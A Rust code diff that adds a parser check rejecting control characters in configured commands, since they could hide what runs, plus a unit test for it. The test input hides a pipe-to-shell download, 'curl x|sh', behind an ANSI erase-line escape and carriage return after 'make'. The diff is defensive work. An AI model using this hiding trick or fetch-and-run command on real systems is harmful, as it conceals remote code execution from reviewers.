@@ -68,6 +68,14 @@ pub(crate) fn read(
                 format!("check {name:?} appears twice"),
             ));
         }
+        if crate::text::hides(check.command.get_ref()) {
+            return Err(fail(
+                Some(check.command.span()),
+                format!(
+                    "check {name:?} has a control character in its command; it could hide what runs"
+                ),
+            ));
+        }
         if check.command.get_ref().trim().is_empty() {
             return Err(fail(
                 Some(check.command.span()),
@@ -224,5 +232,11 @@ mod tests {
         assert_eq!(zero.line, 4);
         let empty = parse(file, "[[check]]\nname = \"a\"\ncommand = \" \"\n").unwrap_err();
         assert_eq!(empty.line, 3);
+        let hidden = parse(
+            file,
+            "[[check]]\nname = \"a\"\ncommand = \"make\\u001b[2K\\rcurl x|sh\"\n",
+        )
+        .unwrap_err();
+        assert_eq!(hidden.line, 3);
     }
 }
